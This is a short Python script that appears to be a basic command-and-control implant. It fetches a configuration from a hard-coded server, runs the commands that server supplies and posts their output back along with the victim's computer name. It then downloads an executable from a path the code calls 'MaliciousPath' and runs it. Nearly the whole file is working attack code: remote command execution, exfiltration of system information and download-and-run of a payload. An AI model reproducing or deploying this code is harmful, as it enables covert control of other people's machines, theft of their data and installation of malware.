import requests
import json
import sys, string, os

SERVERADDRESS = 'http://192.168.3.63'
CONFIGURATIONPATH = '/Configuration'
HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
COMMANDSTOEXE = None
MALICIOUSURL = None


def HttpGetRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.get(SERVERADDRESS+path ,params=parameters, headers=HEADERS)
    return r.text

def HttpPostRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.post(SERVERADDRESS+path, data=parameters, headers=HEADERS)
    return r.text

def conf():

    global SERVERADDRESS
    global COMMANDSTOEXE
    global MALICIOUSURL

    conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
    print(conf)
    #print(json.dumps(conf))
    SERVERADDRESS = 'http://'+conf['Server']
    COMMANDSTOEXE = conf['Commands']
    MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']

def RunCommand(command):
    run = os.popen(command)
    results = run.read()
    run.close()
    return results

def PreperToSend(type,str):
    j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
    return j

def DownloadFile(url):
    #file = url.split('/')[-1]+'.exe'
    #r = requests.Session()
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True, headers=HEADERS)
    file = r.headers['Filename']
    with open(file, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush() commented by recommendation from J.F.Sebastian
    return file

def RemoveFile(local_filename):
    os.remove(local_filename)

def RunExeFile(file):
    os.system(file)

conf()
for command in COMMANDSTOEXE:
    HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
RunExeFile(DownloadFile(MALICIOUSURL))
#print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#RunExeFile(DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg'))

#HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'\ClientInfo',)
